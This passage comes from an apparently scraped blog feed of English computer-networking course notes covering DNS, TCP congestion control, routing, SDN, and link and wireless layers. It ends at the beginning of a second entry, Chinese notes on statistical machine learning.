bypass</strong></li></ul></li><li><strong>Iterated</strong> query &amp; <strong>Recursive</strong> query</li><li>DNS <strong>records</strong>:<ul><li>type = A<ul><li>hostname - IP address</li></ul></li><li>type = CNAME<ul><li>alias name - canonical name</li></ul></li><li>type = NS<ul><li>domain - hostname of authoritative name server</li></ul></li><li>type = MX<ul><li>name - name of SMTP mail server</li></ul></li></ul></li><li><strong>Example</strong>:<ul><li><strong>register</strong> name at DNS registrar<ul><li>provide names, IP addresses of authoritative name server</li><li>inserts NS, A RRs into .com TLD server<ul><li>(networkutopia.com, dns1.networkutopia.com, NS)</li><li>(dns1.networkutopia.com, 212.212.212.1, A)</li></ul></li></ul></li><li><strong>create authoritative server locally</strong> with IP address 212.212.212.1<ul><li>type A record for www.networkuptopia.com</li><li>type MX record for networkutopia.com</li></ul></li></ul></li></ul><h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><ul><li><p><strong>File distribution time</strong>:</p><ul><li><p>client-server: $\max\{NF/u_s,F/d_{min}\}$</p></li><li><p>P2P: $\max\{F/u_s,F/d_{min},NF/(u_s+\sum u_i)\}$</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009876.png" alt=""></p></li></ul></li><li><p>File distribution: <strong>BitTorrent</strong></p><ul><li>tracker</li><li>torrent</li><li>churn</li><li><strong>Sending chunks: tit-for-tat</strong><ul><li>sends chunks to four peers sending her chunks at highest rate </li><li>other peers <strong>choked</strong></li><li>every 30 secs select another peer, starts sending chunks</li><li>optimistically <strong>unchoke</strong> this peer</li></ul></li></ul></li></ul><h3 id="Video-Streaming-and-CDNs"><a href="#Video-Streaming-and-CDNs" class="headerlink" title="Video Streaming and CDNs"></a>Video Streaming and CDNs</h3><ul><li>Challenges:<ul><li><strong>server-to-client bandwidth varies</strong></li><li><strong>changing network congestion levels</strong></li><li><strong>packet loss, delay due to congestion</strong></li></ul></li><li><strong>DASH</strong> (Dynamic, Adaptive Streaming over HTTP)<ul><li><strong>Application-layer protocol</strong>, use <strong>HTTP</strong> and <strong>TCP</strong></li><li>Server:<ul><li>divides video file into <strong>chunks</strong>, encoded at different <strong>rates</strong></li><li>files <strong>replicated</strong> in various <strong>CDN nodes</strong></li><li>provides <strong>URLs</strong> for different chunks (<strong>manifest file</strong>)</li></ul></li><li>Client:<ul><li>periodically <strong>estimates server-to-client bandwidth</strong></li><li><strong>consulting manifest</strong>, requests one chunk at a time </li><li>choose rates at <strong>different time</strong> and from <strong>different servers</strong></li><li><strong>“Intelligence” at client</strong></li></ul></li></ul></li><li><strong>single, large “mega-server”:</strong><ul><li><strong>single point of failure</strong></li><li>point of network <strong>congestion</strong></li><li><strong>long path</strong> to distant clients</li></ul></li><li><strong>CDN</strong>:<ul><li>multiple copies of videos at <strong>geographically distributed sites</strong><ul><li><strong>enter deep</strong>: push servers deep into many access networks</li><li><strong>bring home</strong>: smaller number of larger clusters in POPs near access nets</li></ul></li></ul></li></ul><h2 id="Transport-Layer"><a href="#Transport-Layer" class="headerlink" title="Transport Layer"></a>Transport Layer</h2><h3 id="Services-not-available"><a href="#Services-not-available" class="headerlink" title="Services not available"></a>Services not available</h3><ul><li><strong>Delay</strong> guarantees</li><li><strong>Bandwidth</strong> guarantees</li></ul><h3 id="Demultiplexing"><a href="#Demultiplexing" class="headerlink" title="Demultiplexing"></a>Demultiplexing</h3><ul><li><strong>Connectionless</strong>:<ul><li>UDP: using destination <strong>port number</strong> (only)</li></ul></li><li><strong>Connection-oriented</strong>:<ul><li>TCP: using <strong>4-tuple</strong>, <strong>IP addresses and port numbers</strong></li><li>support <strong>simultaneous TCP sockets</strong></li></ul></li></ul><h3 id="UDP-User-Datagram-Protocol"><a href="#UDP-User-Datagram-Protocol" class="headerlink" title="UDP (User Datagram Protocol)"></a>UDP (User Datagram Protocol)</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009877.png" alt=""></p><ul><li>Pros:<ul><li><strong>No connection establishment</strong> (which <strong>adds RTT delay</strong>)</li><li><strong>No connection state</strong> at sender, receiver</li><li><strong>Small header size</strong></li><li><strong>No congestion control</strong>, blast away as fast as desired</li><li>Helps with <strong>reliability</strong> (checksum)</li></ul></li><li><strong>Used by</strong>:<ul><li>streaming multimedia apps</li><li><strong>DNS</strong></li><li><strong>DHCP</strong></li><li><strong>SNMP</strong></li><li><strong>HTTP/3</strong></li></ul></li></ul><h3 id="RDT-Reliable-Data-Transfer-Protocol"><a href="#RDT-Reliable-Data-Transfer-Protocol" class="headerlink" title="RDT (Reliable Data Transfer Protocol)"></a>RDT (Reliable Data Transfer Protocol)</h3><ul><li><p><strong>Stop and Wait</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009878.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009879.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009880.png" alt=""></p></li><li><p><strong>Go-Back-N</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009881.png" alt=""></p></li><li><p><strong>Selective repeat</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009882.png" alt=""></p></li></ul><h3 id="TCP-Transfer-Control-Protocol"><a href="#TCP-Transfer-Control-Protocol" class="headerlink" title="TCP (Transfer Control Protocol)"></a>TCP (Transfer Control Protocol)</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009883.png" alt=""></p><ul><li><p>Retransmission:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009884.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009885.png" alt=""></p></li><li><p><strong>Flow control</strong>:</p><ul><li>network layer <strong>delivers</strong> data <strong>faster</strong> than application layer <strong>removes</strong> data from socket buffers</li><li><strong>receiver “advertises” free buffer space</strong> in <strong>rwnd</strong> in TCP header</li><li><strong>sender limits amount of unACKed data</strong> to received <strong>rwnd</strong></li></ul></li><li><p><strong>Connection management</strong>:</p><ul><li><p>2-way handshake:</p><ul><li><strong>half open connection</strong> (no client)</li><li><strong>dup data accepted</strong></li></ul></li><li><p>3-way handshake:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009886.png" alt=""></p></li></ul></li></ul><h3 id="Congestion-control"><a href="#Congestion-control" class="headerlink" title="Congestion control"></a>Congestion control</h3><ul><li><p><strong>Costs</strong> of congestion: </p><ul><li><strong>needed retransmissions</strong>: more work for given receiver throughput</li><li><strong>unneeded retransmissions</strong>: link carries multiple copies of a packet</li><li><p><strong>packet dropped</strong>: upstream capacity and buffering wasted</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009887.png" alt=""></p></li></ul></li><li><p><strong>End-end</strong> congestion control:</p><ul><li><strong>no explicit feedback</strong> from network</li><li>congestion <strong>inferred</strong> from <strong>observed loss, delay</strong></li><li>taken by: <strong>TCP</strong></li></ul></li><li><p><strong>Network-assisted</strong> congestion control:</p><ul><li><strong>router</strong>s provide <strong>direct feedback</strong> to hosts</li><li>taken by: <strong>TCP ECN, ATM, DECbit</strong></li></ul></li></ul><h3 id="AIMD-Additive-Increase-Multiplicative-Decrease"><a href="#AIMD-Additive-Increase-Multiplicative-Decrease" class="headerlink" title="AIMD (Additive Increase Multiplicative Decrease)"></a>AIMD (Additive Increase Multiplicative Decrease)</h3><ul><li><p><strong>Multiplicative decrease</strong>:</p><ul><li><strong>Cut in half</strong> on loss detected by triple duplicate ACK (<strong>TCP Reno</strong>)</li><li><strong>Cut to 1 MSS</strong> when loss detected by timeout (<strong>TCP Tahoe</strong>)</li></ul></li><li><p>(1) TCP <strong>slow start</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009888.png" alt=""></p></li><li><p>(2) TCP <strong>congestion avoidance</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009889.png" alt=""></p></li><li><p><strong>AIMD Summary</strong>:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009890.png" alt=""></p></li></ul><h3 id="Other-congestion-control-methods"><a href="#Other-congestion-control-methods" class="headerlink" title="Other congestion control methods"></a>Other congestion control methods</h3><ul><li><p><strong>TCP CUBIC</strong></p><ul><li><p>Increase W as <strong>function of cube distance</strong> between time and K</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009891.png" alt=""></p></li></ul></li><li><p><strong>Delay-based TCP congestion control</strong></p><ul><li>Minimum observed RTT (uncongested path)</li><li>Measured throughput <strong>close to</strong> uncongested throughput:<ul><li><strong>increase cwnd linearly</strong></li></ul></li><li>Measured throughput <strong>far below</strong> uncongested throughout:<ul><li><strong>decrease cwnd linearly</strong></li></ul></li><li><strong>Without inducing/forcing loss</strong></li></ul></li><li><p><strong>ECN</strong> (Explicit congestion notification)</p><ul><li><strong>congestion indication</strong> carried to <strong>destination</strong></li><li><strong>destination</strong> sets <strong>ECE bit</strong> on <strong>ACK segment</strong> to <strong>notify sender</strong></li><li>involves <strong>IP</strong> (header <strong>ECN bit</strong>) and <strong>TCP</strong> (header <strong>C, E bit</strong>)</li></ul></li></ul><h3 id="QUIC-Quick-UDP-Internet-Connections"><a href="#QUIC-Quick-UDP-Internet-Connections" class="headerlink" title="QUIC (Quick UDP Internet Connections)"></a>QUIC (Quick UDP Internet Connections)</h3><ul><li><strong>Application-layer protocol</strong>, use <strong>UDP</strong><ul><li>increase performance of HTTP</li><li>deployed on many Google servers, apps</li><li>parallelism streams, <strong>no HOL blocking</strong></li></ul></li></ul><h2 id="Network-Layer-Data-Plane"><a href="#Network-Layer-Data-Plane" class="headerlink" title="Network Layer: Data Plane"></a>Network Layer: Data Plane</h2><h3 id="Input-port-functions"><a href="#Input-port-functions" class="headerlink" title="Input port functions"></a>Input port functions</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009892.png" alt=""></p><ul><li><strong>Decentralized switching</strong>: <ul><li>Using <strong>header field values</strong>, <strong>lookup output port</strong> using <strong>forwarding table</strong> in memory (“<strong>match plus action</strong>”)</li><li><strong>destination-based forwarding</strong>: based on destination <strong>IP address</strong></li><li><strong>generalized forwarding</strong>: based on any set of <strong>header field values</strong></li></ul></li></ul><h3 id="Switching-fabrics"><a href="#Switching-fabrics" class="headerlink" title="Switching fabrics:"></a><strong>Switching fabrics</strong>:</h3><ul><li>Switching via <strong>memory</strong>:<ul><li>speed limited by memory bandwidth (2 bus crossings per gram)</li></ul></li><li>Switching via <strong>bus</strong>:<ul><li>switching speed limited by bus bandwidth</li></ul></li><li><strong>Switching via interconnection network</strong>:<ul><li>n$\times$n switch from multiple stages of smaller switches</li></ul></li></ul><h3 id="Output-port-functions"><a href="#Output-port-functions" class="headerlink" title="Output port functions"></a>Output port functions</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009893.png" alt=""></p><ul><li><strong>Queueing</strong> and <strong>loss</strong> due to output port <strong>buffer overflow</strong></li><li>Buffer management: <strong>drop</strong> and <strong>marking</strong></li><li><strong>Packet scheduling</strong>: which packet to send next on link<ul><li><strong>FCFS</strong></li><li><strong>Priority</strong>: FCFS within priority class</li><li><strong>Round Robin</strong> (RR): cyclically, repeatedly scans class queues</li><li><strong>Weighted Fair Queueing</strong> (WFQ): minimum bandwidth guarantee</li></ul></li></ul><h3 id="IP-addressing"><a href="#IP-addressing" class="headerlink" title="IP addressing"></a>IP addressing</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302009894.png" alt=""></p><ul><li><strong>Subnets</strong>: device interfaces reaching each other <strong>without passing a router</strong></li><li><strong>CIDR</strong> (Classless InterDomain Routing)</li><li><strong>DHCP</strong> (Dynamic Host Configuration Protocol)<ul><li><strong>Application-layer protocal</strong>, use <strong>UDP</strong></li><li>Pros:<ul><li>can <strong>renew</strong> its lease on address in use</li><li><strong>allows reuse</strong> of addresses (hold address while connected/on)</li><li><strong>support for mobile</strong> users who join/leave network </li></ul></li></ul></li><li><strong>Hierarchical addressing</strong>:<ul><li><strong>route aggregation</strong></li><li>allows efficient advertisement of routing information</li></ul></li><li><strong>ICANN</strong>: allocates IP addresses</li></ul><h3 id="NAT-Network-Address-Translation"><a href="#NAT-Network-Address-Translation" class="headerlink" title="NAT (Network Address Translation)"></a>NAT (Network Address Translation)</h3><ul><li>Devices in <strong>local network</strong> share <strong>one IPv4 address</strong> as outside is concerned</li><li>Pros:<ul><li>just <strong>one IP address</strong> needed from provider ISP for <strong>all devices</strong></li><li><strong>change address</strong> of host in local network <strong>without notifying outside</strong> </li><li><strong>change ISP</strong> without changing addresses of devices in local network</li><li>security: devices inside local net <strong>not directly addressable</strong> by outside</li></ul></li><li>Remember in <strong>NAT translation table</strong></li><li>Violates <strong>end-to-end argument</strong> (<strong>port manipulation</strong> by <strong>network-layer</strong>)</li></ul><h3 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302044072.png" alt=""></p><ul><li><p><strong>IPv6 datagram</strong> as <strong>payload</strong> in IPv4 datagram <strong>among IPv4 routers</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012428.png" alt=""></p></li></ul><h3 id="Generalized-forwarding"><a href="#Generalized-forwarding" class="headerlink" title="Generalized forwarding"></a>Generalized forwarding</h3><ul><li><strong>“match plus action”</strong> abstraction: match <strong>bits in packet header</strong> in <strong>any layers</strong>, take action<ul><li>matching over many fields (<strong>link-, network-, transport-layer</strong>)</li><li>drop, forward, modify, or send matched packet to controller</li><li>“program” network-wide behaviors</li></ul></li></ul><h3 id="Architectural-Principles-of-the-Internet"><a href="#Architectural-Principles-of-the-Internet" class="headerlink" title="Architectural Principles of the Internet"></a>Architectural Principles of the Internet</h3><ul><li>Three cornerstone beliefs:<ul><li><strong>simple connectivity</strong></li><li><strong>IP protocol: that narrow waist</strong></li><li><strong>intelligence, complexity at network edge</strong></li></ul></li></ul><h2 id="Network-Layer-Control-Plane"><a href="#Network-Layer-Control-Plane" class="headerlink" title="Network Layer: Control Plane"></a>Network Layer: Control Plane</h2><h3 id="Routing-protocols"><a href="#Routing-protocols" class="headerlink" title="Routing protocols"></a>Routing protocols</h3><ul><li><strong>Link state</strong>:<ul><li><strong>centralized</strong></li><li><strong>iterative</strong></li><li>link costs depend on <strong>traffic volume</strong>, route oscillations possible</li></ul></li><li><strong>Distance vector</strong>:<ul><li><strong>distributed</strong></li><li><strong>iterative</strong></li><li><strong>asynchronous</strong></li><li><strong>self-stopping</strong></li><li>good news travels fast, bad news travels slow (<strong>count-to-infinity</strong>)</li></ul></li></ul><h3 id="Intra-ISP-routing"><a href="#Intra-ISP-routing" class="headerlink" title="Intra-ISP routing"></a>Intra-ISP routing</h3><ul><li><p>Focus on <strong>performance</strong></p></li><li><p><strong>Aggregate routers into regions</strong> as <strong>autonomous systems (AS)</strong></p><ul><li>Routers in same AS run <strong>same intra-AS protocol</strong></li><li>Routers in different AS run <strong>different intra-AS protocols</strong></li><li><strong>Gateways</strong> perform <strong>inter-AS as well as intra-AS routing</strong></li></ul></li><li><p><strong>Forwarding table</strong> configured by <strong>intra- &amp; inter-AS routing algorithms</strong></p></li><li><p><strong>RIP</strong> (Routing Information Protocol)</p><ul><li><strong>Application-layer protocal</strong>, use <strong>UDP</strong></li><li>classic <strong>DV</strong></li><li>no longer widely used</li></ul></li><li><p><strong>EIGRP</strong> (Enhanced Interior Gateway Routing Protocol)</p><ul><li><strong>Network-layer protocal</strong></li><li><strong>DV</strong> based</li></ul></li><li><p><strong>OSPF</strong> (Open Shortest Path First)</p><ul><li><p><strong>Network-layer protocal</strong>, use <strong>IP</strong></p></li><li><p><strong>LS</strong> routing</p></li><li><p><strong>IS-IS</strong> protocol (ISO standard) essentially same as <strong>OSPF</strong></p></li><li><p><strong>Hierarchical</strong>:</p><ul><li><strong>two-level</strong> hierarchy: local area, backbone.</li><li><p>each node has detailed <strong>area topology</strong> (only direction to others)</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012429.png" alt=""></p></li></ul></li></ul></li></ul><h3 id="Inter-ISP-routing"><a href="#Inter-ISP-routing" class="headerlink" title="Inter-ISP routing"></a>Inter-ISP routing</h3><ul><li><p><strong>Policy</strong> dominates over <strong>performance</strong></p></li><li><p><strong>BGP</strong> (Border Gateway Protocol)</p><ul><li><p><strong>Application-layer protocal</strong>, use <strong>TCP</strong></p></li><li><p><strong>path vector</strong> protocol</p></li><li><p><strong>policy-based</strong> routing: AS1 gateway router 1c chooses path AS3,X</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012430.png" alt=""></p></li><li><p>Route selection:</p><ul><li><strong>local preference</strong> value attribute: <strong>policy</strong> decision</li><li><strong>shortest AS-PATH</strong></li><li><strong>closest NEXT-HOP router</strong> <strong>(hot potato routing)</strong></li></ul></li></ul></li></ul><h3 id="SDN-Software-defined-networking"><a href="#SDN-Software-defined-networking" class="headerlink" title="SDN (Software defined networking)"></a>SDN (Software defined networking)</h3><ul><li><p><strong>Logically centralized</strong> control plane:</p><ul><li><strong>easier</strong> network <strong>management</strong>: avoid misconfigurations, greater flexibility of flows</li><li><strong>table-based</strong> forwarding allows <strong>easier</strong> centralized “<strong>programming</strong>”</li><li><strong>open implementation</strong> of control plane</li></ul></li><li><p>Components:</p><ul><li>Data-plane <strong>switches</strong></li><li>SDN <strong>controller</strong>: distributed for performance, scalability, robustness</li><li>Network-control <strong>apps</strong>: unbundled</li></ul></li><li><p><strong>SDN controller</strong>:</p><ul><li><strong>interface layer</strong> to network control apps: abstractions API</li><li>network-wide <strong>state management</strong>: a distributed database</li><li><strong>communication</strong>: communicate between controller and switches</li></ul></li><li><p><strong>OpenFlow protocol</strong>:</p><ul><li>operates between <strong>controller and switch</strong></li><li><strong>Application-layer protocal</strong>, use <strong>TCP</strong> to exchange messages</li><li>distinct from <strong>OpenFlow API</strong> (specify generalized forwarding actions)</li></ul></li><li><p>Example:</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012431.png" alt=""></p></li><li><p><strong>ODL controller</strong>:</p><ul><li><strong>Service Abstraction Layer</strong>: interconnects internal, external applications and services</li></ul></li></ul><h3 id="ICMP-Internet-Control-Message-Protocol"><a href="#ICMP-Internet-Control-Message-Protocol" class="headerlink" title="ICMP (Internet Control Message Protocol)"></a>ICMP (Internet Control Message Protocol)</h3><ul><li>Communicate <strong>network-level</strong> information</li><li><strong>Network-layer protocal</strong>, carried in <strong>IP datagrams</strong>.</li></ul><h3 id="Network-management"><a href="#Network-management" class="headerlink" title="Network management"></a>Network management</h3><ul><li><p>Components:</p><ul><li>Managing server</li><li>Managed device</li><li>Network management protocol</li></ul></li><li><p><strong>SNMP</strong> (Simple Network Management Protocol):</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012432.png" alt=""></p><ul><li><strong>Application-layer protocol</strong>, use <strong>UDP</strong></li><li><strong>SMI</strong> (Structure of Management Information): data definition language</li></ul></li></ul><h2 id="Link-Layer-and-LANs"><a href="#Link-Layer-and-LANs" class="headerlink" title="Link Layer and LANs"></a>Link Layer and LANs</h2><h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><ul><li>implemented in <strong>network interface card (NIC)</strong> or on a chip</li><li>combination of <strong>hardware, software, firmware</strong><ul><li>framing</li><li><strong>link access</strong></li><li><strong>reliable delivery</strong><ul><li>seldom used on <strong>low bit-error links</strong></li></ul></li><li>flow control</li><li><strong>error detection &amp; correction</strong><ul><li><strong>CRC</strong>: used in <strong>Ethernet</strong>, <strong>802.11 WiFi</strong></li></ul></li></ul></li></ul><h3 id="Multiple-Access-Protocols"><a href="#Multiple-Access-Protocols" class="headerlink" title="Multiple Access Protocols"></a>Multiple Access Protocols</h3><ul><li><p>Channel Partitioning</p><ul><li><strong>TDMA, FDMA</strong></li></ul></li><li><p>Random Access: detect and recover from collisions</p><ul><li><p><strong>ALOHA, slotted ALOHA</strong></p></li><li><p><strong>CSMA, CSMA/CD, CSMA/CA</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012433.png" alt=""></p></li></ul></li><li><p>Taking Turns</p><ul><li><strong>Polling, Token Passing</strong></li></ul></li></ul><h3 id="ARP-Address-Resolution-Protocol"><a href="#ARP-Address-Resolution-Protocol" class="headerlink" title="ARP (Address Resolution Protocol)"></a>ARP (Address Resolution Protocol)</h3><ul><li><strong>Network-layer - Link-layer protocal</strong></li><li>MAC <strong>flat address</strong>:<ul><li><strong>portability</strong> </li><li>move interface from one LAN to another</li></ul></li><li>Routing <strong>within a subnet</strong> or <strong>to another subnet</strong></li></ul><h3 id="Ethernet"><a href="#Ethernet" class="headerlink" title="Ethernet"></a>Ethernet</h3><ul><li><p>Physical topology:</p><ul><li>bus</li><li>switched</li></ul></li><li><p><strong>Ethernet frame</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012434.png" alt=""></p><ul><li>receive frame with matching destination address or with broadcast address (ARP packet), pass data in frame to network layer protocol</li><li>otherwise discard frame</li></ul></li><li><p><strong>Unreliable</strong>, <strong>connectionless</strong>, unslotted <strong>CSMA/CD with binary backoff</strong></p></li></ul><h3 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h3><ul><li>Store and <strong>selectively forward</strong> </li><li><strong>Transparent</strong>, <strong>no collisions</strong></li><li><strong>Plug-and-play</strong>, <strong>self-learning</strong></li></ul><h3 id="VLANs"><a href="#VLANs" class="headerlink" title="VLANs"></a>VLANs</h3><ul><li>Reasons:<ul><li>scaling: all <strong>layer-2 broadcast traffic</strong> must <strong>cross entire LAN</strong> </li><li>efficiency, security, privacy, efficiency issues</li></ul></li><li><strong>Port-based VLAN</strong>:<ul><li><strong>multiple virtual LANS</strong> over <strong>single physical LAN infrastructure</strong></li><li><strong>traffic isolation</strong></li><li><strong>dynamic membership</strong></li><li><strong>forwarding between VLANS via routing</strong></li><li><strong>trunk</strong> port:<ul><li>carry frames between <strong>VLANS over multiple physical switches</strong></li><li>frames must carry <strong>VLAN ID info</strong></li><li><strong>802.1Q protocol</strong> adds/removed additional header fields</li></ul></li></ul></li></ul><h3 id="MPLS-Multiprotocol-label-switching"><a href="#MPLS-Multiprotocol-label-switching" class="headerlink" title="MPLS (Multiprotocol label switching)"></a>MPLS (Multiprotocol label switching)</h3><ul><li>Between <strong>Ethernet</strong> and <strong>IP</strong></li><li><strong>high-speed IP forwarding</strong> among network of <strong>label-switched router</strong></li><li>MPLS <strong>forwarding table</strong> distinct from IP forwarding tables</li><li><strong>Flexibility</strong><ul><li><strong>traffic engineering</strong>: use <strong>destination and source addresses</strong> to route flows to same destination differently</li><li><strong>fast reroute</strong>: <strong>pre-computed backup paths</strong> in case of link failure</li></ul></li></ul><h3 id="Datacenter-networks"><a href="#Datacenter-networks" class="headerlink" title="Datacenter networks"></a>Datacenter networks</h3><ul><li>Network elements:<ul><li>Border routers</li><li>Tier-1 switches</li><li>Tier-2 switches</li><li>Top of Rack (TOR) switch</li><li>Server racks</li></ul></li><li><strong>Load balancer</strong><ul><li><strong>application-layer routing</strong></li><li>hiding data center internals from client</li></ul></li></ul><h2 id="Wireless-and-Mobile-Networks"><a href="#Wireless-and-Mobile-Networks" class="headerlink" title="Wireless and Mobile Networks"></a>Wireless and Mobile Networks</h2><h3 id="Wireless-network-taxonomy"><a href="#Wireless-network-taxonomy" class="headerlink" title="Wireless network taxonomy"></a>Wireless network taxonomy</h3><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012435.png" alt=""></p><h3 id="Wireless-link-characteristics"><a href="#Wireless-link-characteristics" class="headerlink" title="Wireless link characteristics"></a>Wireless link characteristics</h3><ul><li>Differences from wired link:<ul><li><strong>decreased signal strength</strong></li><li><strong>interference</strong> from other sources</li><li><strong>multipath propagation</strong></li></ul></li><li><strong>SNR</strong> (signal-to-noise ratio)<ul><li><strong>given physical layer</strong>: increase power $\rightarrow$ increase SNR $\rightarrow$ decrease BER</li><li><strong>given SNR</strong>: choose physical layer to meet BER requirement, giving highest throughput</li></ul></li><li><strong>Hidden terminal problem &amp; Signal attenuation</strong></li></ul><h3 id="IEEE-802-11-Wireless-LAN"><a href="#IEEE-802-11-Wireless-LAN" class="headerlink" title="IEEE 802.11 Wireless LAN"></a>IEEE 802.11 Wireless LAN</h3><ul><li><p>BSS (Basic Service Set)</p><ul><li>wireless hosts</li><li>access point: base station</li></ul></li><li><p><strong>Active scanning</strong>: </p><ul><li><strong>Probe Request frame</strong> broadcast from H1</li><li><strong>Probe Response frames</strong> sent from APs</li><li>Association Request frame sent to selected AP </li><li>Association Response frame sent from selected AP to H1</li></ul></li><li><p><strong>Passive scanning</strong>:</p><ul><li><strong>Beacon frames</strong> sent from APs</li><li>Association Request frame sent to selected AP </li><li>Association Response frame sent from selected AP to H1</li></ul></li><li><p><strong>CSMA/CA</strong></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012436.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012437.png" alt=""></p><ul><li>difficult to sense collisions: weak received signal due to fading</li><li>can’t sense all collisions in any case: hidden terminal, fading</li></ul></li><li><p>802.11 frame</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012438.png" alt=""></p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302012439.png" alt=""></p></li><li><p>Advanced capabilities:</p><ul><li><strong>Rate adaptation</strong><ul><li>dynamically change transmission rate as mobile moves</li><li>BER becomes too high, switch to lower transmission rate but with lower BER</li></ul></li><li><strong>Power management</strong><ul><li>beacon frame contains list of mobiles with AP-to-mobile frames waiting to be sent</li></ul></li></ul></li><li><p><strong>Bluetooth</strong> (Personal area networks)</p><ul><li><strong>replacement for cables</strong></li><li><strong>ad hoc</strong>: no infrastructure</li><li>master <strong>polls</strong> clients, grants requests for client transmissions</li><li><strong>parked mode</strong>: clients can park and later wakeup</li><li><strong>bootstrapping</strong>: nodes self-assemble into piconet (plug and play)</li></ul></li></ul><h3 id="4G-LTE-Network"><a href="#4G-LTE-Network" class="headerlink" title="4G LTE Network"></a>4G LTE Network</h3><ul><li>LTE data plane protocol stack<ul><li><strong>Packet Data Convergence</strong>: header compression, encryption</li><li><strong>Radio Link Control Protocol</strong>: fragmentation/reassembly </li><li><strong>Medium Access</strong>: requesting, use of radio transmission slots</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能导论 笔记4</title>
      <link href="/2023/06/04/ren-gong-zhi-neng-dao-lun-bi-ji-4/"/>
      <url>/2023/06/04/ren-gong-zhi-neng-dao-lun-bi-ji-4/</url>
      
        <content type="html"><![CDATA[<h1 id="第四章-统计机器学习"><a href="#第四章-统计机器学习" class="headerlink" title="第四章 统计机器学习"></a>第四章 统计机器学习</h1><h2 id="统计机器学习"><a href="#统计机器学习" class="headerlink" title="统计机器学习"></a>统计机器学习</h2><ul><li><p>如果一个系统能够通过执行某个过程改进它的<strong>性能</strong>, 这就是学习.</p></li><li><p>统计学习就是计算机系统通过运用<strong>数据及统计方法</strong>提高系统性能的机器学习.</p></li><li><p>统计学习从<strong>数据</strong>出发, 提取特征, 抽象模型, 发现知识, 回到分析与预测.</p></li><li><p>统计学习的目标就是考虑学习什么样的模型和如何学习, 以使模型能对数据进行准确的预测和分析, 具有<strong>优秀的理论基础与可解释性</strong>.</p><p>  <img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302008766.png" alt=""></p><p>  其中 $x_i$ 为<strong>特征</strong>, $y_i$ 为<strong>标签</strong>. <strong>学习算法</strong> <strong>A</strong> 根据<strong>训练集</strong> <strong>D</strong> 从<strong>假设空间</strong> <strong>H</strong> 中选择一个<strong>最好的</strong> $g\approx f$.</p></li><li><p><strong>统计学习三要素:</strong></p><ul><li><strong>模型</strong>: 学习什么样的模型.<ul><li>条件概率分布、决策函数.</li></ul></li><li><strong>策略</strong>: 模型选择的准则.<ul><li>经验风险最小化、结构风险最小化.</li></ul></li><li><strong>算法</strong>: 模型学习的算法.<ul><li>一般归结为一个<strong>最优化问题</strong>.</li></ul></li></ul></li><li><p><strong>统计机器学习分类: </strong></p><ul><li><strong>监督</strong>学习: 有标签、人为标注 (汉字识别、动物识别).</li><li><strong>非监督</strong>学习: 无标签 (图片归类).</li><li><strong>自监督</strong>学习: 非监督学习的一种 (神经网络语言模型).</li><li><strong>半监督</strong>学习: 综合监督与非监督学习.</li><li><strong>弱监督</strong>学习: 强化学习 (围棋训练).</li></ul></li></ul><h2 id="支持向量机-SVM"><a href="#支持向量机-SVM" class="headerlink" title="支持向量机 (SVM)"></a>支持向量机 (SVM)</h2><ul><li><p><strong>定义:</strong></p><ul><li><strong>二类分类器</strong>: 